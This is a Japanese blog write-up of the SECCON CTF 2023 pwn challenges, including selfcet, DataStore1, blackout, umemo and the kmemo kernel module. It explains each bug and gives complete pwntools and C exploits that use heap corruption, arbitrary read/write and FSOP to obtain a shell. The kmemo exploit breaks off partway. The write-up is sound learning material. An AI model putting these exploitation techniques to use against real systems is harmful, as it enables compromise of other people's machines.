---
layout: page
title: "SECCON CTF 2023 pwn"
date: 2023-11-28 00:00:00 -0000
---

かなり時間がかかりましたが、ようやく一通り触れられたのでまとめました。競技時間中はukqmemoとblackout以外が解けました。どの問題もおもしろかったです。

# selfcet
[CET](https://gigazine.net/news/20200616-intel-cet-bring-tiger-lake/)を自前実装しているバイナリの問題です。forward edgeだけ実装されています。

```c
#include <err.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stddef.h>

#define INSN_ENDBR64 (0xF30F1EFA) /* endbr64 */
#define CFI(f)                                              \
  ({                                                        \
    if (__builtin_bswap32(*(uint32_t*)(f)) != INSN_ENDBR64) \
      __builtin_trap();                                     \
    (f);                                                    \
  })

#define KEY_SIZE 0x20
typedef struct {
  char key[KEY_SIZE];
  char buf[KEY_SIZE];
  const char *error;
  int status;
  void (*throw)(int, const char*, ...);
} ctx_t;

void read_member(ctx_t *ctx, off_t offset, size_t size) {
  if (read(STDIN_FILENO, (void*)ctx + offset, size) <= 0) {
    ctx->status = EXIT_FAILURE;
    ctx->error = "I/O Error";
  }
  ctx->buf[strcspn(ctx->buf, "\n")] = '\0';

  if (ctx->status != 0)
    CFI(ctx->throw)(ctx->status, ctx->error);
}

void encrypt(ctx_t *ctx) {
  for (size_t i = 0; i < KEY_SIZE; i++)
    ctx->buf[i] ^= ctx->key[i];
}

int main() {
  ctx_t ctx = { .error = NULL, .status = 0, .throw = err };

  read_member(&ctx, offsetof(ctx_t, key), sizeof(ctx));
  read_member(&ctx, offsetof(ctx_t, buf), sizeof(ctx));

  encrypt(&ctx);
  write(STDOUT_FILENO, ctx.buf, KEY_SIZE);

  return 0;
}
```

マクロの`CFI`は、飛び先の1命令目が`endbr64`かどうかを確認し、そうでなければ飛ばないようになっています。つまりここで制御を奪っても、gadgetにつなぐことはできず、普通に関数を呼べるだけです。

read_memberは適当に構造体サイズ分だけの書き込みをしており、大きくオーバーフローしていることが分かります。書き込みのあと、`ctx->status`が非ゼロなら`CFI(ctx->throw)`に飛びます。2度目はもう少しオフセットが大きいため、スタックのリターンアドレスまで書き込むことができます。

この問題では、このread_memberは2回呼ばれるので、1度目でリーク、2度目かmainからのリターンで制御を取りたいです。

まず、リークがない状態で、呼び出し先を変えたいときは、もともとあるアドレスからその一部を書き換え、近くのアドレスに向けるテクニックを使います。アドレスの下位12ビットはASLRの影響を受けないので、1バイトか2バイトの書き換えは高確率で成功し、もとある関数の、近くの関数を使うことができます。

`ctx->throw`にはもともとlibcの`err`という関数が置かれています。

このerrの付近の関数を調べたり、errの中を調べて試していると、[__vwarn_internal](https://codebrowser.dev/glibc/glibc/misc/err.c.html#__vwarn_internal)という関数が良さそうです。第一引数をポインタとして表示してくれそうです。`CFI(ctx->throw)(ctx->status, ctx->error)`の形で呼ぶので、今回は引数2つまでコントロールできますので、第一引数をgotに向けて、libcリークを得ると良いでしょう。

さてリークができたので、あとは`system("/bin/sh")`で終わりのはずですが、なんと第一引数は`int`なので、32ビットしか入ってきません。bssへの格納するとリークができないし、no-pieのバイナリの中にも、他にコマンド実行に使える文字列はありません。

2度目のread_memberはmainからのリターンアドレスの書き換えができますが、canaryが分かりません。一発で書き込んで制御を奪わないといけないので、リークを手に入れることはできません。

こういう時は逆にcanaryの比較元を変えるテクニックがあります。特定のアドレスを既知の値で書くことができれば、canaryはその値になります。そこで、「endbr64から始まる関数」かつ「第二引数のポインタの中身を定数に書き換える」という関数をひたすら挙げて試します。gmtime_r, modf, ctime, asctime_r, strtod, strtof, wcstodと試しましたが上手くいきません。中には上手く書けるものもありましたが、今度はもとあるcanaryと食い違いそれぞれの関数の中でabortしてしまいます。

またループ狙いで普通にmainやstartを呼び戻そうとしますが、こちらは`endbr64`を持っていない関数のため、`CFI`からは飛べません。

いろいろ考えて、最後はsignalを使う方法を思いつきます。`signal(6, main)`とすると、逆にcanaryを壊してabortすることで、アボートハンドラとしてmainに戻ってくれます。

戻った後は、getsで文字列をbssに格納し、systemで呼び出して終わりです。

```python
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './xor'
HOST = '172.17.0.3'
HOST = 'selfcet.seccon.games'
PORT = 9999

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

while (1):
    r = start()
    if args.D:
	    debug(r, [0x1181])

    payload =b''
    payload += flat(0x111, 0x222, 0x333, 0x444, 0x555, 0x666, 0x777, 0x888, 0x401000, elf.got.write)#, 0x401000)#, 0xbbbb)
    if args.R:
        payload += b'\x40\x6f' # 1/16
    else:
        payload += b'\x40\x0f' # 1/16
    #pause()
    r.send(payload)
    try:
        if args.R:
            #r.recvuntil(b'chal: ')
            r.recvuntil(b'xor: ')
        else:
            r.recvuntil(b'xor: ')
        break
    except:
        pass
    r.close()
leak = u64(r.recvuntil(b': ', True).ljust(8, b'\x00'))
dbg('leak')

base = leak - 0x114a20
system = base + 0x50d60
signal = base + 0x42420
gets = base + 0x805a0

bss = 0x404000

payload =b''
payload += flat(0x111, 0x222, 0x333, 0x444, elf.sym.main, 6, signal, 0x8888, 0x999, 0xaaaa, 0xbbbb)
r.send(payload)

payload =b''
payload += flat(0x111, 0x222, 0x333, 0x444, 0x555, 0x666, 0x777, 0x888, 0x9999, bss, gets)
r.sendafter(b'terminated\n', payload)

sleep(1)
r.sendline(b'/bin/sh\x00')
sleep(1)

payload =b''
payload += flat(0x111, 0x222, 0x333, 0x444, 0x5555, bss, system, 0x8888, 0x999, 0xaaaa, 0xbbbb)
r.send(payload)
r.interactive()
r.close()
```

想定解はprctlを使ってfsの先をを変更して、canaryの位置を変えるそうです。これはきれい。

# DataStore1

見た目はノート問です。配列、文字列、整数、小数をわけて格納することができるデータ構造を、追加したり編集したりできます。

配列を編集するときに、`idx > arr->count`がエラーの条件になっていて、`idx = arr->count`の時は通ってしまいます。

```c
static int edit(data_t *data){
        if(!data)
                return -1;

        printf("\nCurrent: ");
        show(data, 0, false);

        switch(data->type){
                case TYPE_ARRAY:
                        {
                                arr_t *arr = data->p_arr;

                                printf("index: ");
                                unsigned idx = getint();
                                if(idx > arr->count)
                                        return -1;

                                printf("\n"
                                                "1. Update\n"
                                                "2. Delete\n"
                                                "> ");

                                switch(getint()){
                                        case 1:
                                                edit(&arr->data[idx]);
                                                break;
                                        case 2:
                                                remove_recursive(&arr->data[idx]);
                                                break;
                                }
                        }
                        break;
```

これを使って、隣接チャンクの先頭8バイトが書き換えられるようになります。str_tは先頭がサイズなので、隣接チャンクをStringのデータにすることで、先頭8バイトを書き換えるとStringの文字列長を伸ばせます。さらにそのStringを編集することで、以降のチャンクを自由に書き換えられるようになります。あとはAAR/Wを作ってしまえばおしまいです。

```python
from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './chall'
HOST = 'datastore1.seccon.games'
PORT = 4585
#HOST = '172.17.0.3'
#PORT = 9999

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		#return process(TARGET)
		return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))


r = start()
if args.D:
	debug(r, [0x1419])

def list():
    r.sendlineafter(b'> ', b'2')

def add_value(pos, value, array=False):
    for n in pos:
        r.sendlineafter(b'> ', b'1')
        r.sendlineafter(b'index: ', str(n).encode())
    r.sendlineafter(b'> ', b'1')
    r.recvuntil(b'type:')
    if array == True:
        r.sendlineafter(b'> ', b'a')
    else:
        r.sendlineafter(b'> ', b'v')
    if type(value) == str: # str
        value = value.encode()
    if type(value) != bytes: # int, float 
        value = str(value).encode()
    r.sendlineafter(b': ', value)

def edit_str(pos, s):
    for n in pos:
        r.sendlineafter(b'> ', b'1')
        r.sendlineafter(b'index: ', str(n).encode())
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b': ', s)

def delete_value(pos):
    for n in pos:
        r.sendlineafter(b'> ', b'1')
        r.sendlineafter(b'index: ', str(n).encode())
    r.sendlineafter(b'> ', b'2')

def add_array(pos, n):
    add_value(pos, n, array=True)

add_array([], 15)
add_array([0], 15)
add_array([1], 0)
delete_value([1])
add_value([1], b'a' * 0x30)
delete_value([0, 15])
add_value([0, 15], 0x1337)
#edit_str([1], b'a'*0x20+flat(0xdead, 0xbeef) ) # heap overflow

add_array([2], 2)
add_array([3], 2)

add_value([2, 0], b'b' * 0x10)
edit_str([1], b'a'*0xd0+flat(0, 0x31, 2, 0xfeed0003))

list()
r.recvuntil(b' <I> ')
leak = int(r.recvuntil(b'\n', True))
dbg('leak')
heap = leak - 0x500
dbg('heap')

for i in range(10):
    add_value([0, 4+i], b'x'*0x40)
add_value([0, 4+10], flat(0x21, 0x21) * 4)


def aaw(where, what):
    payload = b''
    payload += b'c'*0x20
    payload += flat(len(what)+1, where)
    payload = payload.ljust(0xd0, b'd')
    payload += flat(0, 0x31, 2, 0xfeed0002)
    edit_str([1], payload)
    edit_str([2, 0], what)

def aar(where):
    payload = b''
    payload += b'c'*0x20
    payload += flat(9, where)
    payload = payload.ljust(0xd0, b'd')
    payload += flat(0, 0x31, 2, 0xfeed0002)
    edit_str([1], payload)
    list()
    r.recvuntil(b'[02] <ARRAY(2)>')
    r.recvuntil(b'<S> ')
    leak = u64(r.recvuntil(b'\n', True).ljust(8, b'\x00'))
    return leak

aaw(heap+0x5e8, p64(0x521))
delete_value([3])
leak = aar(heap+0x5f0)
dbg('leak')
base = leak -0x219ce0
environ = base + 0x221200
rdi = base + 0x001bc061
leak = aar(environ)
dbg('leak')
target = leak -0x120
binsh = base + 0x1d8698
system = base+ 0x50d60
puts = base + 0x80ed0
aaw(target, flat(rdi+1, rdi, binsh, system))
#leak = aar(target)
#dbg('leak')


r.sendlineafter(b'> ', b'0')

r.interactive()
r.close()

```

この問題はスムーズに解けて、firstbloodでした。

# blackout
ノート問で、入力したキーワードをマスクする機能があります。no-pieです。解けませんでした。

後から聞くと、`#define _GNU_SOURCE`がないことが原因で、その挙動は[仕様](https://gcc.gnu.org/legacy-ml/gcc-help/2019-10/msg00095.html)だったそうです。`To use memmem() you have to define _GNU_SOURCE.`ということで、このdefineが無いと、memmemは32ビットを返すと思われて、memmemから戻ったポインタが`cdqe`されて上位32ビットが消えてしまいます。

no-pieになっていたのは、普通にheapを使っている限りでは32ビットにされてもちゃんと動くようにするためでしょうか。4バイト長のアドレスを超えてチャンクを取り始めると、初めてオーバーラップするようになります。

32ビット以上のアドレスを得るためには、4GBほどの大量のアロケーションを行う必要がありますが、これは手元では大きすぎて動かず、逆になぜかネットワーク越しにやると上手くいきます。dockerを使うことで、ローカルでデバッグすることができるようになります。このパターンは知らなかったです。

あとは簡単で、例えば１６進数で`20XX`のサイズのチャンクヘッダに対し、blackoutで`20`をwordとして指定すると、`2aXX`に変化するのでこれをfreeすることで、隣接チャンクがオーバーラップします。あとはunsortdbinをコントロールしながらlibcとheapをリークしたうえで、好きなところに書き込みます。

heapのレイアウトは以下の通りです。

```
A 0x20 (@heap+0x2a0)  <-- Bのヘッダをずらす
B 0x2000 <-- "20"の部分をあとで"2a"に変えてC以降のチャンクをオーバーラップさせる
C 0x40 <-- libcアドレスをリークする
D 0x40 <-- heapアドレスをリークする
E 0x3c0 <-- tcache poisoning用
F 0x3c0 <-- freeするだけ
（0x20サイズのヘッダをたくさん置いておく）<-- オーバーラップしたチャンクBの隣接チャンクのふりをする

...

G 0x30（@heap+0x1000002a0）<-- blackoutしてBのチャンクヘッダを大きくする
```

このレイアウトにした後、以下の手順で操作することで、任意アドレスを確保することができます。

- Bをfreeする
- サイズを調整してmallocし、C、Dでそれぞれlibc、heapをリークする
- F、Eの順番にfreeする
- Fのfdを書き換えて任意アドレスを確保し、書き込む

他所のリークが難しいこと、一度に大きく書き換えられることから、stdoutを書き換えfsopを狙います。（念のためtcacheの構造体を書き換えていますが不要と思います。）

```python
from pwn import *
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './blackout'
HOST = 'blackout.seccon.games'
#HOST = '172.17.0.1'
PORT =  9999

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()

def alloc(idx, s,  size=-1):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b': ', str(idx).encode())
    if size == -1:
        r.sendlineafter(b': ', str(len(s)).encode())
    else:
        r.sendlineafter(b': ', str(size).encode())
    r.sendafter(b': ', s)
def blackout(idx, w):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b': ', str(idx).encode())
    r.sendlineafter(b': ', w)

def delete(idx):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b': ', str(idx).encode())

total = 0
def bulk_alloc_payload(idx, s,  size=-1):
    global total
    if size == -1:
        ret = f'1\n{idx}\n{len(s)+1}\n'.encode()+s+b'\n'
        total += len(s)+1
    else:
        ret = f'1\n{idx}\n{size}\n'.encode()+s+b'\n'
        total += size
    return ret


#context.log_level = 'debug'
n = 0x10000-0x11
tcache_size = 0x3b0

p = b''
#for i in range(n):
log.info('building payload... ')
p += bulk_alloc_payload(0, b'A'*0x10)
p += bulk_alloc_payload(1, b'B'*0x1ff0)
p += bulk_alloc_payload(2, b'C'*0x30)
p += bulk_alloc_payload(3, b'D'*0x30)
p += bulk_alloc_payload(4, b'E'*tcache_size)
p += bulk_alloc_payload(5, b'F'*tcache_size)
p += bulk_alloc_payload(6, p64(0x21)*(0xa00//8))

p += bulk_alloc_payload(6, b'_', 0x10000-total)

for i in range(n):
    p += bulk_alloc_payload(6, b'_', 0x10000)

p += bulk_alloc_payload(6, b'_', 0x80) #adjust

log.info('sending...')
r.send(p)
log.info('payload sent')

for i in range(n):
    r.recvuntil(b'> ')
context.log_level = 'debug'
if args.D:
	debug(r, [0x13e1])
	#debug(r, [0x13fc, 0x15be])

alloc(6, b'g'*0x19+b'G')
blackout(6, b'G')
r.recvuntil(b'dacted]\n')
delete(1)

alloc(6, b'H'*0x1ff0)
blackout(2, b'a')
r.recvuntil(b'dacted]\n')
binleak = r.recvuntil(b'\n', True).ljust(8, b'\x00')
assert b'*' not in binleak # bad luck
leak = u64(binleak)
base = leak - 0x219ce0
dbg('base')
stdout = base + 0x21a780
system = base + 0x50d60
stdout_lock = base + 0x21ba70

alloc(6, b'I'*0x20)
alloc(6, b'J'*0xa00)

blackout(3, b'a')
r.recvuntil(b'dacted]\n')
binleak = r.recvuntil(b'\n', True).ljust(8, b'\x00')
assert b'*' not in binleak # bad luck
leak = u64(binleak)
heap = leak - 0x22e0
dbg('heap')

delete(5)
delete(4)

payload = b''
payload += b'1'*0x48
payload += flat(0x3c1, (heap+0x10) ^ ((heap+0x2000) >>12))

alloc(6, payload+b'\n', 0x60)
alloc(6, b'2'+b'\n', tcache_size)
payload = b''
payload += p64(0x7000700070007) * 16
payload += flat(stdout)*0x30
alloc(6, payload+b'\n', tcache_size)

payload = b''
payload += flat(0x0101010101010101, u64(b';/bin/sh')) # flags, readp
payload += flat(0, 0) # reade, readb
payload += flat(0, 1) # writeb, writep
payload += flat(0, 0) # bufb, bufp
payload += flat(0, 0) # bufe, saveb
payload += flat(0, 0) # backb, savee
payload += flat(0, 0) # markers, chain
payload += flat(system, 0) # fileno|flags2, old_offset
payload += flat(0, stdout_lock) # 0, lock
payload += flat(0, 0) # offset, codecvt
payload += flat(stdout, 0) # wide_data, freeres_list
payload += flat(0, 0) # freeres_buf
payload += flat(0xffffffff, 0) # freeres_buf
#payload += flat(0, base+0x2160c0-0x58+0x18) # 0, vtable
payload += flat(0, base+0x2160c0) # 0, vtable
payload += flat(stdout+8)

alloc(6, payload)

r.interactive()
r.close()

```

# umemo

この問題はfullchainの問題になっていて、ユーザランド、カーネルモジュール、qemuエスケープで３つにわかれています。umemoはこのうちのユーザランドのプロセスになります。

2問目がある以上モジュールにはバグはないと思って、ユーザランドのバイナリを集中して見ていましたが、競技時間中は特に怪しいところを見つけられずに終わりました。そしてバグはカーネルモジュールにありました。

まず、メモを保存する領域`memos`はmmapで確保されて、最初の0x1000バイトのところに配列として、それぞれのメモへのポインタが置かれます。このポインタはユーザランド側のアドレスが入ります。

```c
        char **memos;
        if((memos = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0)) == MAP_FAILED){
                perror("mmap");
                return -1;
        }

        for(int i=0; i<0xf; i++)
                memos[i] = (char*)memos + 0x100*(i+1);
```


free_spaceでは、オフセットを指定してそこに書き込むことができます。このとき、最初の1ページは`memos`のアドレスが格納されているため、ここの読み書きができるとプロセスのAAR/Wがいきなり完成しますが、これは上手くいきません。

get_ofs_szで指定するオフセットは `offset = getint() + 0x1000`のように入力された数値に0x1000を加え、また直後にオーバーフローのチェックがあるため、結果として0x1000を下回るサイズを返却させることができないからです。

```c
static void free_space(int fd){
	size_t len;
	char buf[0x400];

	int get_ofs_sz(void){
		uint32_t offset;

		printf("Offset: ");
		if((offset = getint() + 0x1000) < 0x1000 || lseek(fd, offset, SEEK_SET) < 0){
			puts("Out of range");
			return -1;
		}

		printf("Size: ");
		if((len = getint()) > 0x400){
			puts("Too large");
			return -1;
		}

		return 0;
	}

	for(;;){
		printf("\n"
				"1. Read\n"
				"2. Write\n"
				"0. Back\n"
				"S> ");

		switch(getint()){
			case 1:
				if(get_ofs_sz() < 0)
					break;

				printf("Output: ");
				if((ssize_t)(len = read(fd, buf, len)) < 0 || write(STDOUT_FILENO, buf, len) < 0)
					puts("Read space failed...");
				break;
			case 2:
				if(get_ofs_sz() < 0)
					break;

				printf("Input: ");
				if((ssize_t)(len = read(STDIN_FILENO, buf, len)) < 0 || write(fd, buf, len) < 0)
					puts("Write space failed...");
				break;
			default:
				return;
		}
	}
}
```

ところでカーネルモジュールの実装ですが、readのハンドラは以下のようになっています。注目は`*f_pos += len;`で、`*f_pos`がいくら大きくなっても、`remain`がある限り次のループに行くことになります。つまりオフセットを`memos`の構造体のギリギリ範囲内にして、読み出しサイズを`memos`の構造体からはみ出すように指定したとき、`*f_pos`は決まったサイズより１だけ大きい値になります。

```c
static ssize_t chrdev_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos){
	const struct memo *memo = filp->private_data;
	size_t remain;

	if(!memo)
		return -EIO;

	mutex_lock(&filp->f_pos_lock);
	for(remain = count; remain > 0; ){
		const loff_t poff = *f_pos % 0x1000;
		const size_t len = poff + remain > 0x1000 ? 0x1000 - poff : remain;

		const char *data = get_memo_ro(memo, *f_pos);
		if(!data || copy_to_user(buf, data + poff, len))
			if(clear_user(buf, len))
				goto ERR;

		*f_pos += len;
		buf += len;
		remain -= len;
	}

ERR:
	mutex_unlock(&filp->f_pos_lock);
	return count-remain;
}
```

一旦２つをまとめると、具体的にはユーザプロセスで`offset`を0x3ffffeff8、`len`を0x400にした状態で1度 `read`を呼ぶと、`get_memo_ro`は、`get_memo_ro(memo, 0x3fffffff8)`と、`get_memo_ro(memo, 0x40000000)`の2回呼ばれます。

get_memo_roからは__pgoff_to_memopageが呼ばれますが、この時`*f_pos`にあった値はPAGE_SHIFT（１２）ビット分シフトされて`pgoff`に入っています。そして、この`pgoff`には大きさのチェックがありません。

```c
static void *__pgoff_to_memopage(struct memo *memo, const pgoff_t pgoff, const bool modable, void *new_page){
	void *ret = NULL;

	if(!memo) return NULL;

	mutex_lock(&memo->lock);

	struct memo_page_table **p_top = &memo->top;
	if(!*p_top && (!modable || !(*p_top = (void*)get_zeroed_page(GFP_KERNEL))))
		goto ERR;

	struct memo_page_table **p_med = (struct memo_page_table**)&(*p_top)->entry[(pgoff >> MEMOPAGE_TABLE_SHIFT) & ((1<<MEMOPAGE_TABLE_SHIFT)-1)];
	if(!*p_med && (!modable || !(*p_med = (void*)get_zeroed_page(GFP_KERNEL))))
		goto ERR;

	char **p_data = (char**)&(*p_med)->entry[pgoff & ((1<<MEMOPAGE_TABLE_SHIFT)-1)];
	if(modable && (!*p_data || new_page))
		*p_data = *p_data ? (free_page((uintptr_t)*p_data), new_page) : (memo->count++, (new_page ?: (void*)get_zeroed_page(GFP_KERNEL)));
	ret = *p_data;

ERR:
	mutex_unlock(&memo->lock);
	return ret;
}
```

ここでは該当する中間ページテーブルをさらに、`(pgoff >> MEMOPAGE_TABLE_SHIFT) & ((1<<MEMOPAGE_TABLE_SHIFT)-1)`とシフトしてマスクして決定して参照します。ところが実際に値は、`(1<<MEMOPAGE_TABLE_SHIFT)-1`は`0x1ff`のところ、`(pgoff >> MEMOPAGE_TABLE_SHIFT)`は`0x200`とはみ出ているので、論理積で0になってしまいます。

つまり、マップされた領域をはみ出すように、オフセットを大きくして読み書きの指示を出すことで、オフセット0の中間ページテーブルが選択され、結果memosのアドレスが格納されているポインタが返ってきます。

このポインタからメモのアドレスがリークし、同様にオフセットを指定して書き換えることで、ユーザランドのAAR/Wになります。

1. write_fixedを使って、スペースを登録する
2. read_freespaceを使って、マップされた領域の端ギリギリのところをオフセットにして、オフセット0を読む。ここで1.で登録したスペースのアドレスが出てくる。
3. write_freespaceを2.と同様のオフセットとサイズを利用して、オフセット0部の書き込みを行う。
4. これで、read_fixedを使って、3.で指定アドレスが読めて、writeで同様に書き込める。

以降は、リークしたポインタをたどってデバイス→隣接するlibc→environとつないでスタックアドレスをリークし、リターンアドレスを書き換えてスタックに向けて制御を取ります。

あとは書き込むだけなのですが、ttyとの直接のやりとりになっていて、送った文字は制御文字として扱われてしまいます。具体的には`7f`がbackspaceとして扱われ、`7f`を入れることができません。（ttyの拡張が有効になっている場合は、`167f`と送ると上手くいくケースがありますが、これも今回は使えませんでした。）

一方で`04`はctrl+Dとして扱われ、入力を途中で切ることができます。今回はこちらは使えるので、これを利用して`7f`が書かれているところはそのままにして、ポインタを一部書き換えるようにします。

```python
def exploit_umemo(r):
    # helper functions for pwning umemo
    def switch_fixed():
        r.sendlineafter(b'\n> ', b'1')

    def switch_freespace():
        r.sendlineafter(b'\n> ', b'2')

    def read_fixed(idx):
        r.sendlineafter(b'\nM> ', b'1')
        r.sendlineafter(b': ', str(idx).encode())

    def write_fixed(idx, data):
        r.sendlineafter(b'\nM> ', b'2')
        r.sendlineafter(b': ', str(idx).encode())
        r.sendafter(b': ', data)

    def back():
        r.sendlineafter(b'> ', b'0')

    def read_freespace(offset, size):
        r.sendlineafter(b'\nS> ', b'1')
        r.sendlineafter(b': ', str(offset).encode())
        r.sendlineafter(b': ', str(size).encode())

    def write_freespace(offset, size, data):
        r.sendlineafter(b'\nS> ', b'2')
        r.sendlineafter(b': ', str(offset).encode())
        r.sendlineafter(b': ', str(size).encode())
        r.sendafter(b': ', data)

    switch_fixed()
    write_fixed(0, b'AAAABBBB\x04')
    back()
    switch_freespace()
    read_freespace(0x3fffeff8, 0x400)
    r.recvuntil(b'Output: ')
    binleak = b''
    while len(binleak) < 0x10:
        binleak += r.recv(1)
    leak = u64(binleak[8:])
    #print(f'leak: 0x{leak:x}')
    dev = leak - 0x100
    back()

    libc_ptr = dev + 0x1110

    def aar(where):
        switch_freespace()
        payload = b''
        payload += b'a'*(0x8)
        payload += flat(where)
        if b'\x7f' in payload:
            payload = payload.split(b'\x7f')[0]
            payload += b'\x04'
        else:
            payload += b'\x0a'

        write_freespace(0x3fffeff8, len(payload)-1, payload)
        back()
        switch_fixed()
        read_fixed(0)

        r.recvuntil(b'Output: ')
        binleak = b''
        while len(binleak) < 8:
            binleak += r.recv(1)
        back()
        return u64(binleak)

    def aaw(where, what):
        switch_freespace()
        payload = b''
        payload += b'a'*(0x8)
        payload += flat(where)
        if b'\x7f' in payload:
            payload = payload.split(b'\x7f')[0]
            payload += b'\x04'
        else:
            payload += b'\x0a'

        write_freespace(0x3fffeff8, len(payload), payload)
        back()
        switch_fixed()
        if b'\x7f' in what:
            what = what.split(b'\x7f')[0]
        write_fixed(0, what)
        back()

    base = aar(libc_ptr)
    leak = aar(base + 0x185160)
    target = leak - 0x128
    payload = b''
    payload += p64(target+8)
    payload = payload.split(b'\x7f')[0]+b'\x04'
    aaw(target, payload)

    payload = b''
    payload += asm('''
        nop
        push rsp
        pop rsi
        xor edi, edi
        mov dl, 0x7a
        syscall
    ''')
    aaw(target+8, asm(shellcraft.sh())+b'\x04')
    back()

```

結局バグはいろいろ解釈ができそうですが、ユーザプロセス側都合の守りたいアドレスはカーネルはケアしないので、実際にまじめに書いていてもこういうことが起りそうでおもしろかったです。

- free_spaceはページのオフセットを超える指定ができてしまう
- __pgoff_to_memopageはpgoffの上限チェックをしていない
- chrdev_readはf_posの上限をチェックしていない

それはそれで、この問題はやれることが少く作ってあったのでオーバーラップは見られるべきで、従ってこのバグは発見できるべきでした。反省。

# kmemo
ほぼ答えを見てそのままなぞる形になりました。

バグは1か所だけで、mmapのfaultで取られるページには、参照カウンタのインクリメントがないようです。このモジュールのfdをバインドしてmmapしたあと、munmapを使うと解放され、そのあとの他の場所でページフォルトが起こると、同じアドレスを取るようになります。

```c
static vm_fault_t mmap_fault(struct vm_fault *vmf){
        struct memo *memo = vmf->vma->vm_private_data;
        if(!memo)
                return VM_FAULT_OOM;

        char *data = get_memo_rw(memo, vmf->pgoff << PAGE_SHIFT);
        if(!data)
                return VM_FAULT_OOM;

        vmf->page = virt_to_page(data);

        return 0;
}
```

一見正しそうに動いているのですが、munmapを使った後も、ページテーブルにはアドレスが残り続け参照できますので、これを利用します。memoモジュールには3段のページテーブルが実装されていて、オフセットに対応してtop、mid、その下に各アドレスが並びます。

1ページが `1<<12`のサイズ単位で区切られ、midのテーブルが`1<<(12+9)`のサイズ単位で区切られます。topは1つです。想定解がこれを利用したきれいなAARWの構築方法を使います。といっても、munmapで解放するページのオフセットと、そのあとでフォルトを起こすオフセットをmidのサイズ単位である`1<<(12+9)`を超えればよいだけです。midのテーブルの単位異常の差があると、当然新しくmidのテーブルが追加されますが、これがreuseされたアドレスになります。

例えばオフセット`1<<21`でmmapした後書き込み、munmapして、今度はオフセット0に書き込みます。そうすると、`1<<21`のmidテーブルの先のmunmapされたアドレスは、オフセット0のmidテーブルを指します。あとは、オフセット`1<<21`に値を書き込むと、オフセット0のポインタをコントロールできるようになるので、これを使って自由に読み書きできるようになります。

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>

#define ADDR_IDT 0xfffffe0000000000

uint64_t buffer[0x100];
int fd = 0;
uint64_t *mem = NULL;

void exploit_pause() {
        puts("[+] pause!");
        getchar();
}

int main(){
        int shift = 12+9;
        setbuf(stdout, NULL);
        if((fd = open("/dev/tmp-memo", O_RDWR)) < 0) { perror("open"); }
        //puts("mmap");
        if((mem = (uint64_t *)mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 1<<shift)) == MAP_FAILED) { perror("mmap"); }
        mem[0] = 0xbeefbeef;
        //puts("unmap");
        munmap(mem, 0x1000); // free mmaped page index 1<<shift
        //exploit_pause();

        //puts("seekfd");
        lseek(fd, 0, SEEK_SET);
        //puts("writefd");

        // page fault at index 0 --> edge table of index 1<<shift will points to mid table of index 0 reused.
        write(fd, (uint64_t[]){ 0xdeadbeef }, sizeof(uint64_t));

        // input addr to index 1<<shift, and access index 0 to gain aarw
        int aar(void *buf, uintptr_t addr, size_t len) {
                uint64_t old;
                int ret;
                pread(fd, &old, sizeof(uint64_t), 1<<shift);
                pwrite(fd, &addr, sizeof(uint64_t), 1<<shift);
                ret = pread(fd, buf, len, 0);
                pwrite(fd, &old, sizeof(uint64_t), 1<<shift);
                return ret;
        }
        int aaw(void *buf, uintptr_t addr, size_t len) {
                uint64_t old;
                int ret;
                pread(fd, &old, sizeof(uint64_t), 1<<shift);
                pwrite(fd, &addr, sizeof(uint64_t), 1<<shift);
